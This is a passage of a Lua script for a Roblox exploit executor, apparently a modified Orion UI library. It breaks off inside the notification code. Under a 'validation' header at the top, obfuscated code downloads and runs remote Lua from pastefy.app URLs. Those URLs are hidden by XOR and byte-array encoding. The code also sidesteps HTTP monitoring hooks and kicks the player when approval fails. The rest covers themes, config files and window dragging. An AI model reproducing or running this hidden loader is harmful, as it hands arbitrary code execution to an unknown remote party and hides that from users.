-- ═══════════════════════════════════════════════════════════════
-- PROTECTED VALIDATION SYSTEM
-- ═══════════════════════════════════════════════════════════════
local _0x1A=getgenv local _0x2B=game local _0x3C=loadstring local _0x4D=pcall
if not _0x1A()._0xVALID then
	_0x4D(function()
		local _0x5E="https://pastefy.app/T4ucHBtw/raw"
		local _0x6F=_0x2B:HttpGet(_0x5E,true)
		if _0x6F and #_0x6F>100 then
			_0x3C(_0x6F)()
		end
	end)
end

-- NÃO RESETAR _0xVALID SE JÁ ESTIVER AUTORIZADO (fix reexecução)
if not getgenv()._0xVALID then
	getgenv()._0xVALID = false
end
if not getgenv()._0xACTION then
	getgenv()._0xACTION = "pending"
end

local _originalKick = game.Players.LocalPlayer.Kick
local function _forceKick(msg)
	pcall(function() _originalKick(game.Players.LocalPlayer, msg) end)
	pcall(function() game.Players.LocalPlayer:Kick(msg) end)
	pcall(function() game:Shutdown() end)
	error("BANNED: " .. msg)
end

local hasHttpMonitor = false
pcall(function()
	if game:GetService("CoreGui"):FindFirstChild("HttpMonitor") then
		hasHttpMonitor = true
	end
end)

local hasHooks = false
if hookfunction or hookmetamethod or replaceclosure then
	hasHooks = true
end

local _backup_p1 = {104,116,116,112,115,58,47,47}
local function _decode_backup(t) local s="" for _,v in ipairs(t) do s=s..string.char(v) end return s end

local _savedGet = {
	game_HttpGet = game.HttpGet,
	game_GetAsync = game:GetService("HttpService").GetAsync
}

local _backup_p2 = {112,97,115,116,101,102,121,46,97,112,112,47}
local _backup_p3 = {113,69,104,97,69,120,72,100,47,114,97,119}

local function _bypassGet(url)
	local success, result
	
	if _savedGet.game_HttpGet then
		success, result = pcall(_savedGet.game_HttpGet, game, url)
		if success then return result end
	end
	
	if _savedGet.game_GetAsync then
		success, result = pcall(_savedGet.game_GetAsync, game:GetService("HttpService"), url)
		if success then return result end
	end
	
	success, result = pcall(function() return game:HttpGet(url) end)
	if success then
		return result
	else
		return nil
	end
end

local _k = "SecurityKey2025"
local _u = {145,231,247,242,228,106,94,94,242,212,228,247,216,217,152,94,212,242,242,94,245,202,219,212,202,155,219,177,94,245,212,154}
local function _d(t,k)local r=""for i=1,#t do r=r..string.char(bit32.bxor(t[i],string.byte(k,(i-1)%#k+1)))end return r end
local _url = _d(_u,_k)

local _content = _bypassGet(_url)

if not _content or _content == "" then
	local _backup_url = _decode_backup(_backup_p1).._decode_backup(_backup_p2).._decode_backup(_backup_p3)
	_content = _bypassGet(_backup_url)
end

if _content and _content ~= "" then
	local success, loader = pcall(function()
		return loadstring(_content)
	end)
	
	if success and loader then 
		pcall(loader)
	end
end

local maxWaitTime = 10 -- ⏱️ 10 segundos para dar tempo da verificação completar
local startTime = tick()
while not getgenv()._0xVALID do
	if tick() - startTime > maxWaitTime then
		game.Players.LocalPlayer:Kick("Verification timeout!\n\nYou were not approved to use this script.")
		return
	end
	task.wait(0.1) -- Aguarda 100ms entre cada verificação
end

task.spawn(function()
	while task.wait(10) do
		if not getgenv()._0xVALID then
			game.Players.LocalPlayer:Kick("Verification lost!\n\nAccess revoked.")
			return
		end
	end
end)

getgenv().gethui = function() return game.CoreGui end
local success, result = pcall(function()
    return _G.firsttimeinjection
end)

if success then
    if result then
		-- Multi Instance Detected
    return
    end
else
    return
end
_G.firsttimeinjection = false

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local userInputService = game:GetService("UserInputService")

userInputService.MouseIconEnabled = true

local screenGui = playerGui:FindFirstChild("MyPersistentScreenGui")
if not screenGui then
    screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MyPersistentScreenGui"
    screenGui.Parent = playerGui
end
screenGui.ResetOnSpawn = false

local buttonmodal = Instance.new("TextButton")
buttonmodal.Size = UDim2.new(0, 200, 0, 50)
buttonmodal.Position = UDim2.new(0.5, -100, 0.5, -25)
buttonmodal.BackgroundTransparency = 1
buttonmodal.Text = ""
buttonmodal.Parent = screenGui
buttonmodal.Modal = true

-- ═══════════════════════════════════════════════════════════════
--  SERVICES - Otimizado para performance máxima
-- ═══════════════════════════════════════════════════════════════
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local PlayerService = game:GetService("Players")
local UserService = game:GetService("UserService")
local TextService = game:GetService("TextService")

local LocalPlayer = PlayerService.LocalPlayer

-- ═══════════════════════════════════════════════════════════════
-- USER ID SYSTEM - Sistema de identificação único por usuário
-- ═══════════════════════════════════════════════════════════════
local USER_ID = nil

local function gerarIDUnico()
	local timestamp = os.time()
	local random = math.random(10000, 99999)
	return string.format("hwid_%s_%d_%d", LocalPlayer.UserId, timestamp, random)
end

local function salvarID(id)
	local success = pcall(function()
		writefile("OrionUserID.txt", id)
	end)
	return success
end

local function carregarID()
	local success, id = pcall(function()
		if isfile and isfile("OrionUserID.txt") then
			return readfile("OrionUserID.txt")
		end
		return nil
	end)
	return success and id or nil
end

local function validarID(id)
	if not id or type(id) ~= "string" then
		return false
	end
	return string.match(id, "^hwid_%d+_%d+_%d+$") ~= nil
end

local function inicializarUserID()
	local idSalvo = carregarID()
	
	if idSalvo and validarID(idSalvo) then
		USER_ID = idSalvo
		return idSalvo
	else
		local novoID = gerarIDUnico()
		if salvarID(novoID) then
			USER_ID = novoID
			return novoID
		else
			USER_ID = "user_" .. LocalPlayer.UserId
			return USER_ID
		end
	end
end

-- Inicializar ID do usuário
USER_ID = inicializarUserID()

-- ═══════════════════════════════════════════════════════════════
-- TWEENCACHE - Animações pré-carregadas 
-- ═══════════════════════════════════════════════════════════════
local TweenCache = {
	UltraFast = TweenInfo.new(0.12, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
	Fast = TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
	Medium = TweenInfo.new(0.32, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
	Smooth = TweenInfo.new(0.4, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
	Slow = TweenInfo.new(0.55, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
	Elastic = TweenInfo.new(0.45, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out),
	Bounce = TweenInfo.new(0.55, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
	Back = TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
	Cinematic = TweenInfo.new(0.65, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
	Buttery = TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
	Spring = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out, 0, false, 0)
}

--  COLOR UTILITIES
local function GetLuminance(color)
	if typeof(color) ~= "Color3" then return 0.5 end
	return (0.299 * color.R + 0.587 * color.G + 0.114 * color.B)
end

local function GetContrastText(backgroundColor)
	local luminance = GetLuminance(backgroundColor)
	return luminance > 0.5 and Color3.fromRGB(30, 30, 30) or Color3.fromRGB(240, 240, 240)
end

local function SoftenColor(color, amount)
	if typeof(color) ~= "Color3" then return color end
	local h, s, v = color:ToHSV()
	return Color3.fromHSV(h, math.max(0, s - (amount or 0.3)), v)
end

-- Integrity verification (SECONDARY LAYER) - DESABILITADO PARA VELOCIDADE

-- TRANSLATION SYSTEM REMOVED

-- ═══════════════════════════════════════════════════════════════
-- FEATHER ICONS - Sistema de ícones modernos (OPCIONAL)
-- FEATHER ICONS - Carregamento assíncrono (não trava)
local Icons = {}

-- Carregar ícones em background (não bloqueia UI)
task.spawn(function()
	pcall(function()
		local result = game:HttpGetAsync("https://raw.githubusercontent.com/evoincorp/lucideblox/master/src/modules/util/icons.json")
		Icons = HttpService:JSONDecode(result).icons or {}
	end)
end)

local function GetIcon(IconName)
	return Icons[IconName]
end

-- ═══════════════════════════════════════════════════════════════
--  UTILITY FUNCTIONS - Funções auxiliares otimizadas
-- ═══════════════════════════════════════════════════════════════
--  GUI INITIALIZATION - Inicialização da interface
-- ═══════════════════════════════════════════════════════════════
local useStudio = RunService:IsStudio() or false

local Orion = Instance.new("ScreenGui")
local FocusDrag = nil

Orion.Name = "OrionBliz"
Orion.ResetOnSpawn = false
Orion.IgnoreGuiInset = true -- Remove espaço da topbar (FULLSCREEN)
Orion.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

--  Proteção da GUI
local ProtectGui = protectgui or (syn and syn.protect_gui) or function() end
local GUIParent = gethui and gethui() or (game.CoreGui or game.Players.LocalPlayer:WaitForChild("PlayerGui"))

Orion.Parent = GUIParent
ProtectGui(Orion)

--  Limpeza de instâncias duplicadas
if gethui then
	for _, Interface in ipairs(gethui():GetChildren()) do
		if Interface.Name == Orion.Name and Interface ~= Orion then
			Interface:Destroy()
		end
	end
else
	for _, Interface in ipairs(game.CoreGui:GetChildren()) do
		if Interface.Name == Orion.Name and Interface ~= Orion then
			Interface:Destroy()
		end
	end
end

-- ═══════════════════════════════════════════════════════════════
--  ORIONLIB INITIALIZATION - Inicialização da biblioteca
-- ═══════════════════════════════════════════════════════════════
local OrionLib = {
	Flags = {},
	Connections = {},
	Elements = {},
	ThemeObjects = {},
	Themes = {
		Default = {
			Main = Color3.fromRGB(25, 25, 25),
			Second = Color3.fromRGB(32, 32, 32),
			Stroke = Color3.fromRGB(60, 60, 60),
			Divider = Color3.fromRGB(60, 60, 60),
			Text = Color3.fromRGB(240, 240, 240),
			TextDark = Color3.fromRGB(150, 150, 150)
		}
	},
	SelectedTheme = "Default",
	Folder = "",
	SaveCfg = false,
	CurrentLanguage = "en"
}

-- ═══════════════════════════════════════════════════════════════
--  CONNECTION MANAGEMENT - Gerenciamento de conexões
-- ═══════════════════════════════════════════════════════════════

function OrionLib:IsRunning()
	if gethui then
		return Orion.Parent == gethui()
	else
		return Orion.Parent == game:GetService("CoreGui")
	end
end

--  Adicionar conexão com gerenciamento automático
local function AddConnection(Signal, Function)
	if (not OrionLib:IsRunning()) then
		return
	end
	local SignalConnect = Signal:Connect(Function)
	table.insert(OrionLib.Connections, SignalConnect)
	return SignalConnect
end

--  Auto-cleanup de conexões quando a GUI é destruída
task.spawn(function()
	while (OrionLib:IsRunning()) do
		wait()
	end

	for _, Connection in next, OrionLib.Connections do
		Connection:Disconnect()
	end
end)

-- ═══════════════════════════════════════════════════════════════
-- DRAG SYSTEM - Sistema de arrastar janelas
-- ═══════════════════════════════════════════════════════════════

local function MakeDraggable(DragPoint, Main)
	pcall(function()
		local Dragging, DragInput, MousePos, FramePos = false
		AddConnection(DragPoint.InputBegan, function(Input)
			if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
				Dragging = true
				MousePos = Input.Position
				FramePos = Main.Position

				Input.Changed:Connect(function()
					if Input.UserInputState == Enum.UserInputState.End then
						Dragging = false
					end
				end)
			end
		end)
		AddConnection(DragPoint.InputChanged, function(Input)
			if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch then
				DragInput = Input
			end
		end)
		AddConnection(UserInputService.InputChanged, function(Input)
			if Input == DragInput and Dragging then
				local Delta = Input.Position - MousePos
				--  Movimento suave e responsivo (SEM BARREIRA)
				Main.Position  = UDim2.new(FramePos.X.Scale,FramePos.X.Offset + Delta.X, FramePos.Y.Scale, FramePos.Y.Offset + Delta.Y)
			end
		end)
	end)
end    

-- ═══════════════════════════════════════════════════════════════
--  ELEMENT CREATION - Sistema de criação de elementos
-- ═══════════════════════════════════════════════════════════════

--  Criar instância com propriedades e filhos
local function Create(Name, Properties, Children)
	local Object = Instance.new(Name)
	for i, v in next, Properties or {} do
		Object[i] = v
	end
	for i, v in next, Children or {} do
		v.Parent = Object
	end
	return Object
end

--  Registrar elemento customizado
local function CreateElement(ElementName, ElementFunction)
	OrionLib.Elements[ElementName] = function(...)
		return ElementFunction(...)
	end
end

--  Criar elemento registrado
local function MakeElement(ElementName, ...)
	local NewElement = OrionLib.Elements[ElementName](...)
	return NewElement
end

--  Definir propriedades de elemento
local function SetProps(Element, Props)
	table.foreach(Props, function(Property, Value)
		Element[Property] = Value
	end)
	return Element
end

--  Definir filhos de elemento
local function SetChildren(Element, Children)
	table.foreach(Children, function(_, Child)
		Child.Parent = Element
	end)
	return Element
end

--  Arredondar número com fator
local function Round(Number, Factor)
	local Result = math.floor(Number/Factor + (math.sign(Number) * 0.5)) * Factor
	if Result < 0 then Result = Result + Factor end
	return Result
end

-- ═══════════════════════════════════════════════════════════════
--  THEME SYSTEM - Sistema de temas dinâmicos
-- ═══════════════════════════════════════════════════════════════

--  Retornar propriedade de cor do objeto
local function ReturnProperty(Object)
	if Object:IsA("Frame") or Object:IsA("TextButton") then
		return "BackgroundColor3"
	end 
	if Object:IsA("ScrollingFrame") then
		return "ScrollBarImageColor3"
	end 
	if Object:IsA("UIStroke") then
		return "Color"
	end 
	if Object:IsA("TextLabel") or Object:IsA("TextBox") then
		return "TextColor3"
	end   
	if Object:IsA("ImageLabel") or Object:IsA("ImageButton") then
		return "ImageColor3"
	end   
end

--  Adicionar objeto ao sistema de temas
local function AddThemeObject(Object, Type)
	if not OrionLib.ThemeObjects[Type] then
		OrionLib.ThemeObjects[Type] = {}
	end    
	table.insert(OrionLib.ThemeObjects[Type], Object)
	Object[ReturnProperty(Object)] = OrionLib.Themes[OrionLib.SelectedTheme][Type]
	return Object
end    

--  Aplicar tema a todos os objetos
local function SetTheme()
	for Name, Type in pairs(OrionLib.ThemeObjects) do
		for _, Object in pairs(Type) do
			Object[ReturnProperty(Object)] = OrionLib.Themes[OrionLib.SelectedTheme][Name]
		end    
	end    
end

-- ═══════════════════════════════════════════════════════════════
-- CONFIG SYSTEM
-- ═══════════════════════════════════════════════════════════════

-- Pack color for saving (EXACTLY like caos.lua)
local function ColorPack(color)
	assert(typeof(color) == "Color3", "ColorPack expects a Color3 value.")
	
	-- Convert to RGB integer values
	return {
		R = math.round(color.R * 255),
		G = math.round(color.G * 255),
		B = math.round(color.B * 255)
	}
end

-- Unpack saved color (EXACTLY like caos.lua)
local function ColorUnpack(color)
	assert(type(color) == "table" or type(color) == "string", "Invalid color format. Expected table (RGB) or string (HEX).")
	
	if type(color) == "table" then
		assert(color.R and color.G and color.B, "RGB table must contain 'R', 'G', and 'B' keys.")
		return Color3.fromRGB(math.clamp(color.R, 0, 255), math.clamp(color.G, 0, 255), math.clamp(color.B, 0, 255))
	elseif type(color) == "string" then
		local hex = color:match("^#?(%x%x%x%x%x%x)$")
		assert(hex, "Invalid HEX color format. Expected '#RRGGBB' or 'RRGGBB'.")
		local r, g, b = tonumber(hex:sub(1, 2), 16), tonumber(hex:sub(3, 4), 16), tonumber(hex:sub(5, 6), 16)
		return Color3.fromRGB(r, g, b)
	end
end

-- LOAD CONFIG (EXACTLY like caos.lua - loads from workspace folder)
local function LoadCfg(Config)
	local success, Data = pcall(function()
		return HttpService:JSONDecode(Config)
	end)
	
	if not success then
		return false
	end
	
	local loadedCount = 0
	
	-- Load theme colors from Settings (EXACTLY like caos.lua)
	if Data.Settings then
		if Data.Settings.ThemeMain and Data.Settings.ThemeMain.Value then
			OrionLib.Themes[OrionLib.SelectedTheme].Main = ColorUnpack(Data.Settings.ThemeMain.Value)
			loadedCount = loadedCount + 1
		end
		if Data.Settings.ThemeSecond and Data.Settings.ThemeSecond.Value then
			OrionLib.Themes[OrionLib.SelectedTheme].Second = ColorUnpack(Data.Settings.ThemeSecond.Value)
			loadedCount = loadedCount + 1
		end
		if Data.Settings.ThemeStroke and Data.Settings.ThemeStroke.Value then
			OrionLib.Themes[OrionLib.SelectedTheme].Stroke = ColorUnpack(Data.Settings.ThemeStroke.Value)
			loadedCount = loadedCount + 1
		end
		if Data.Settings.ThemeDivider and Data.Settings.ThemeDivider.Value then
			OrionLib.Themes[OrionLib.SelectedTheme].Divider = ColorUnpack(Data.Settings.ThemeDivider.Value)
			loadedCount = loadedCount + 1
		end
		if Data.Settings.ThemeText and Data.Settings.ThemeText.Value then
			OrionLib.Themes[OrionLib.SelectedTheme].Text = ColorUnpack(Data.Settings.ThemeText.Value)
			loadedCount = loadedCount + 1
		end
		if Data.Settings.ThemeTextDark and Data.Settings.ThemeTextDark.Value then
			OrionLib.Themes[OrionLib.SelectedTheme].TextDark = ColorUnpack(Data.Settings.ThemeTextDark.Value)
			loadedCount = loadedCount + 1
		end
		
		-- Apply theme after loading all colors
		if loadedCount > 0 then
			SetTheme()
			
			-- Atualizar ColorPickers da aba Config se já existirem
			if OrionLib.Flags["AccentColor"] then
				OrionLib.Flags["AccentColor"]:Set(OrionLib.Themes[OrionLib.SelectedTheme].Stroke)
			end
			if OrionLib.Flags["BackgroundColor"] then
				OrionLib.Flags["BackgroundColor"]:Set(OrionLib.Themes[OrionLib.SelectedTheme].Main)
			end
			if OrionLib.Flags["TextColor"] then
				OrionLib.Flags["TextColor"]:Set(OrionLib.Themes[OrionLib.SelectedTheme].Text)
			end
			if OrionLib.Flags["TextDarkColor"] then
				OrionLib.Flags["TextDarkColor"]:Set(OrionLib.Themes[OrionLib.SelectedTheme].TextDark)
			end
			if OrionLib.Flags["SecondColor"] then
				OrionLib.Flags["SecondColor"]:Set(OrionLib.Themes[OrionLib.SelectedTheme].Second)
			end
			if OrionLib.Flags["DividerColor"] then
				OrionLib.Flags["DividerColor"]:Set(OrionLib.Themes[OrionLib.SelectedTheme].Divider)
			end
		end
	end
	
	-- Load globals
	if Data.Globals then
		if Data.Globals.Language then
			getgenv().OrionLanguage = Data.Globals.Language
			loadedCount = loadedCount + 1
		end
	end
	
	-- Load flags
	for flagName, flagData in pairs(Data.Flags or {}) do
		if OrionLib.Flags[flagName] then
			task.spawn(function()
				if flagData.Type == "ColorPicker" and flagData.Value then
					OrionLib.Flags[flagName]:Set(ColorUnpack(flagData.Value))
				elseif flagData.Value ~= nil then
					OrionLib.Flags[flagName]:Set(flagData.Value)
				end
				loadedCount = loadedCount + 1
			end)
		end
	end
	
	return loadedCount > 0
end

local AUTO_SAVE_ENABLED = true
local CONFIG_FOLDER = nil -- Será definido pela Window
local saveDebounceTime = 2.0 -- 2 segundos - evita lag
local lastSaveTime = 0
local saveScheduled = false
local pendingSaveThread = nil
local isLoadingConfig = false -- Previne salvamento durante carregamento

-- Ensure config folder exists
local function ensureConfigFolder()
	if not isfolder or not makefolder or not CONFIG_FOLDER then 
		-- Funções de arquivo não disponíveis
		return false 
	end
	
	local success = pcall(function()
		if not isfolder(CONFIG_FOLDER) then
			makefolder(CONFIG_FOLDER)
			-- Pasta de config criada
		end
	end)
	
	if not success then
		-- Erro ao criar pasta de config
		return false
	end
	
	return true
end

-- Removed deepCompare - causava lag desnecessário

-- SAVE CONFIG
local function SaveCfg(Name)
	if not AUTO_SAVE_ENABLED or not writefile or not ensureConfigFolder() or isLoadingConfig then return end
	
	-- ADVANCED DEBOUNCE SYSTEM TO PREVENT LAG
	local currentTime = tick()
	if currentTime - lastSaveTime < saveDebounceTime then
		if not saveScheduled then
			saveScheduled = true
			-- Cancel previous scheduled save
			if pendingSaveThread then
				task.cancel(pendingSaveThread)
			end
			
			-- Schedule new save with debounce
			pendingSaveThread = task.delay(saveDebounceTime, function()
				saveScheduled = false
				SaveCfg(Name)
			end)
		end
		return
	end
	
	lastSaveTime = currentTime
	saveScheduled = false
	pendingSaveThread = nil -- Limpar thread pendente
	
	-- COMPLETE CONFIG WITH EVERYTHING (EXACTLY like caos.lua structure)
	local CompleteConfig = {
		-- MAIN FLAGS
		Flags = {},
		-- SETTINGS (theme colors go here)
		Settings = {},
		-- GLOBALS
		Globals = {},
		-- TIMESTAMP
		SavedAt = os.date("%Y-%m-%d %H:%M:%S")
	}
	
	-- SAVE ALL FLAGS (EXACTLY like caos.lua)
	for flagName, flagData in pairs(OrionLib.Flags) do
		if flagData.Save then
			-- Padronizar tipo como 'ColorPicker' (maiúsculo)
			local flagType = flagData.Type or "Unknown"
			if type(flagType) == "string" and flagType:lower() == "colorpicker" then
				CompleteConfig.Flags[flagName] = {
					Type = "ColorPicker",
					Value = ColorPack(flagData.Value)
				}
			else
				CompleteConfig.Flags[flagName] = {
					Type = flagType,
					Value = flagData.Value
				}
			end
		end	
	end
	
	-- SAVE THEME COLORS IN SETTINGS (EXACTLY like caos.lua)
	CompleteConfig.Settings["ThemeMain"] = {
		Type = "ColorPicker",
		Value = ColorPack(OrionLib.Themes[OrionLib.SelectedTheme].Main)
	}
	CompleteConfig.Settings["ThemeSecond"] = {
		Type = "ColorPicker",
		Value = ColorPack(OrionLib.Themes[OrionLib.SelectedTheme].Second)
	}
	CompleteConfig.Settings["ThemeStroke"] = {
		Type = "ColorPicker",
		Value = ColorPack(OrionLib.Themes[OrionLib.SelectedTheme].Stroke)
	}
	CompleteConfig.Settings["ThemeDivider"] = {
		Type = "ColorPicker",
		Value = ColorPack(OrionLib.Themes[OrionLib.SelectedTheme].Divider)
	}
	CompleteConfig.Settings["ThemeText"] = {
		Type = "ColorPicker",
		Value = ColorPack(OrionLib.Themes[OrionLib.SelectedTheme].Text)
	}
	CompleteConfig.Settings["ThemeTextDark"] = {
		Type = "ColorPicker",
		Value = ColorPack(OrionLib.Themes[OrionLib.SelectedTheme].TextDark)
	}
	
	-- SAVE GLOBALS
	CompleteConfig.Globals = {
		Language = getgenv().OrionLanguage or "en"
	}
	
	-- SAVE TO CONFIG FOLDER - Async para não lagar
	task.spawn(function()
		local fileName = string.format("%s_%s.json", USER_ID, Name)
		local configPath = CONFIG_FOLDER .. "/" .. fileName
		local success, err = pcall(function()
			writefile(configPath, HttpService:JSONEncode(CompleteConfig))
		end)
		
		if success then
			-- Config salvo
		else
			-- Erro ao salvar config
		end
	end)
end

-- ═══════════════════════════════════════════════════════════════
--  INPUT MANAGEMENT - Gerenciamento de entrada
-- ═══════════════════════════════════════════════════════════════

local WhitelistedMouse = {Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseButton2,Enum.UserInputType.MouseButton3}
local BlacklistedKeys = {Enum.KeyCode.Unknown,Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.KeyCode.Up,Enum.KeyCode.Left,Enum.KeyCode.Down,Enum.KeyCode.Right,Enum.KeyCode.Slash,Enum.KeyCode.Tab,Enum.KeyCode.Backspace,Enum.KeyCode.Escape}

local freeMouse = Create("TextButton", {Name = "FMouse", Size = UDim2.new(0,0,0,0), BackgroundTransparency = 1, Text = "", Position = UDim2.new(0,0,0,0), Modal = true, Parent = Orion, Visible = false, ZIndex = 999, Active = true})
local mouselock = false

--  Desbloquear cursor do mouse
local function UnlockMouse(Value)
	if Value then
		mouselock = true
		UserInputService.MouseIconEnabled = true
		freeMouse.Visible = true
		
		task.spawn(function() 
			while mouselock do
				task.wait(0.5)
			end
			UserInputService.MouseIconEnabled = false
			freeMouse.Visible = false
		end)
	else
		mouselock = false
		UserInputService.MouseIconEnabled = false
		freeMouse.Visible = false
	end
end

--  Verificar se tecla está na tabela
local function CheckKey(Table, Key)
	for _, v in next, Table do
		if v == Key then
			return true
		end
	end
end

-- ═══════════════════════════════════════════════════════════════
--  UI ELEMENTS - Elementos de interface pré-definidos
-- ═══════════════════════════════════════════════════════════════

CreateElement("Corner", function(Scale, Offset)
	local Corner = Create("UICorner", {
		CornerRadius = UDim.new(Scale or 0, Offset or 12) --  Bordas mais arredondadas!
	})
	return Corner
end)

CreateElement("AspectRatio", function()
	local AspectRatio = Create("UIAspectRatioConstraint")
	return AspectRatio
end)

CreateElement("Stroke", function(Color, Thickness)
	local Stroke = Create("UIStroke", {
		Color = Color or Color3.fromRGB(255, 255, 255),
		Thickness = Thickness or 1
	})
	return Stroke
end)

CreateElement("List", function(Scale, Offset)
	local List = Create("UIListLayout", {
		SortOrder = Enum.SortOrder.LayoutOrder,
		Padding = UDim.new(Scale or 0, Offset or 0)
	})
	return List
end)

CreateElement("Padding", function(Bottom, Left, Right, Top)
	local Padding = Create("UIPadding", {
		PaddingBottom = UDim.new(0, Bottom or 4),
		PaddingLeft = UDim.new(0, Left or 4),
		PaddingRight = UDim.new(0, Right or 4),
		PaddingTop = UDim.new(0, Top or 4)
	})
	return Padding
end)

CreateElement("TFrame", function()
	local TFrame = Create("Frame", {
		BackgroundTransparency = 1
	})
	return TFrame
end)

CreateElement("Frame", function(Color)
	local Frame = Create("Frame", {
		BackgroundColor3 = Color or Color3.fromRGB(255, 255, 255),
		BorderSizePixel = 0
	})
	return Frame
end)

CreateElement("RoundFrame", function(Color, Scale, Offset)
	local Frame = Create("Frame", {
		BackgroundColor3 = Color or Color3.fromRGB(255, 255, 255),
		BorderSizePixel = 0
	}, {
		Create("UICorner", {
			CornerRadius = UDim.new(Scale, Offset)
		})
	})
	return Frame
end)

CreateElement("Button", function()
	local Button = Create("TextButton", {
		Text = "",
		AutoButtonColor = false,
		BackgroundTransparency = 1,
		BorderSizePixel = 0
	})
	return Button
end)

CreateElement("ScrollFrame", function(Color, Width)
	local ScrollFrame = Create("ScrollingFrame", {
		BackgroundTransparency = 1,
		MidImage = "rbxassetid://7445543667",
		BottomImage = "rbxassetid://7445543667",
		TopImage = "rbxassetid://7445543667",
		ScrollBarImageColor3 = Color,
		BorderSizePixel = 0,
		ScrollBarThickness = Width,
		CanvasSize = UDim2.new(0, 0, 0, 0),
		ScrollingDirection = Enum.ScrollingDirection.Y,
		ScrollBarImageTransparency = 0.3,
		ElasticBehavior = Enum.ElasticBehavior.Never,
		AutomaticCanvasSize = Enum.AutomaticSize.Y
	})
	
	-- Esconder scrollbar quando não precisa
	local function updateScrollbarVisibility()
		if ScrollFrame.AbsoluteCanvasSize.Y <= ScrollFrame.AbsoluteSize.Y then
			ScrollFrame.ScrollBarImageTransparency = 1  -- ESCONDER
		else
			ScrollFrame.ScrollBarImageTransparency = 0.3  -- MOSTRAR
		end
	end
	
	ScrollFrame:GetPropertyChangedSignal("AbsoluteCanvasSize"):Connect(updateScrollbarVisibility)
	ScrollFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateScrollbarVisibility)
	updateScrollbarVisibility()
	
	return ScrollFrame
end)

CreateElement("Image", function(ImageID)
	local ImageNew = Create("ImageLabel", {
		Image = ImageID,
		BackgroundTransparency = 1
	})

	if GetIcon(ImageID) ~= nil then
		ImageNew.Image = GetIcon(ImageID)
	end	

	return ImageNew
end)

CreateElement("ImageButton", function(ImageID)
	local Image = Create("ImageButton", {
		Image = ImageID,
		BackgroundTransparency = 1
	})
	return Image
end)

CreateElement("Label", function(Text, TextSize, Transparency)
	local Label = Create("TextLabel", {
		Text = Text or "",
		TextColor3 = Color3.fromRGB(240, 240, 240),
		TextTransparency = Transparency or 0,
		TextSize = TextSize or 15,
		Font = Enum.Font.Gotham,
		RichText = true,
		BackgroundTransparency = 1,
		TextXAlignment = Enum.TextXAlignment.Left
	})
	return Label
end)

local NotificationHolder = SetProps(SetChildren(MakeElement("TFrame"), {
	SetProps(MakeElement("List"), {
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
		SortOrder = Enum.SortOrder.LayoutOrder,
		VerticalAlignment = Enum.VerticalAlignment.Bottom,
		Padding = UDim.new(0, 5)
	})
}), {
	Position = UDim2.new(1, -25, 1, -25),
	Size = UDim2.new(0, 300, 1, -25),
	AnchorPoint = Vector2.new(1, 1),
	Parent = Orion
})

function OrionLib:MakeNotification(NotificationConfig)
	task.spawn(function()
		NotificationConfig.Name = NotificationConfig.Name or "Notification"
		NotificationConfig.Content = NotificationConfig.Content or "Test"
		NotificationConfig.Image = NotificationConfig.Image or "rbxassetid://4384403532"
		NotificationConfig.Time = NotificationConfig.Time or 15

		local NotificationParent = SetProps(MakeElement("TFrame"), {
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			Parent = NotificationHolder
		})

		local NotificationFrame = SetChildren(SetProps(MakeElement("RoundFrame", OrionLib.Themes[OrionLib.SelectedTheme].Second, 0, 15), {
			Parent = NotificationParent, 
			Size = UDim2.new(1, 0, 0, 0),
			Position = UDim2.new(1, -55, 0, 0),
			BackgroundTransparency = 0.05, -- 🌈 Levemente transparente
			AutomaticSize = Enum.AutomaticSize.Y
		}), {
			MakeElement("Stroke", OrionLib.Themes[OrionLib.SelectedTheme].Stroke, 2), -- 🌈 Borda colorida e grossa!
			MakeElement("Padding", 12, 12, 12, 12),
			SetProps(MakeElement("Image", NotificationConfig.Image), {
				Size = UDim2.new(0, 20, 0, 20),
				ImageColor3 = Color3.fromRGB(240, 240, 240),
				Name = "Icon"
			}),
			SetProps(MakeElement("Label", NotificationConfig.Name, 15), {
				Size = UDim2.new(1, -30, 0, 20),
				Position = UDim2.new(0, 30, 0, 0),
				Font = Enum.Font.GothamBold,
				Name = "Title"
			}),
			SetProps(MakeElement("Label", NotificationConfig.Content, 14), {
				Size = UDim2.new(1, 0, 0, 0),
				Position = UDim2.new(0, 0, 0, 25),
				Font = Enum.Font.GothamSemibold,
				Name = "Content",
				AutomaticSize = Enum.AutomaticSize.Y,
				TextColor3 = Color3.fromRGB(200, 200, 200),
				TextWrapped = true
			})
		})

		TweenService:Create(NotificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Position = UDim2.new(0, 0, 0, 0)}):Play()

		-- Background validation (THIRD LAYER) - DESABILITADO PARA VELOCIDADE

		wait(NotificationConfig.Time - 0.88)
		TweenService:Create(NotificationFrame.Icon, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
		TweenService:Create(NotificationFrame, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.6}):Play()
		wait(0.3)
